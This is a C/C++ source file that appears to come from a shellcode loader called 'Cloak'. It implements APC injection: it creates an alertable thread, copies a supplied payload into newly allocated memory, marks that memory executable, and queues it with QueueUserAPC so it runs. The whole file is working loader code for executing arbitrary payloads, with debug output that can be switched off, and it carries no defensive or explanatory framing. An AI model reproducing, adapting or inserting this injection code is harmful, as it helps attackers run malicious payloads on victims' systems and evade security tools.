#include "Cloak.hpp"

#ifdef APC
VOID WaitForSingleObjectExAlertable() {
    HANDLE hEvent = CreateEvent( NULL, NULL, NULL, NULL );
    if ( hEvent ) {
        WaitForSingleObjectEx( hEvent, INFINITE, TRUE );
        CloseHandle( hEvent );
    }
}

BOOL ApcInjection( IN PBYTE pbPayload[], IN SIZE_T sPayloadSize ) {
    HANDLE  hThread         = NULL;
    PVOID   pPayloadAddress = NULL;
    DWORD   dwOldProtect    = NULL;

    hThread = CreateThread(NULL, NULL, ( LPTHREAD_START_ROUTINE ) &WaitForSingleObjectExAlertable, NULL, NULL, NULL);
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) ;
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! QueueUserAPC( ( PAPCFUNC ) pPayloadAddress, hThread, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] QueueUserAPC Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    WaitForSingleObject(hThread, WAIT_TIME);

    return TRUE;
}
#endif // !APC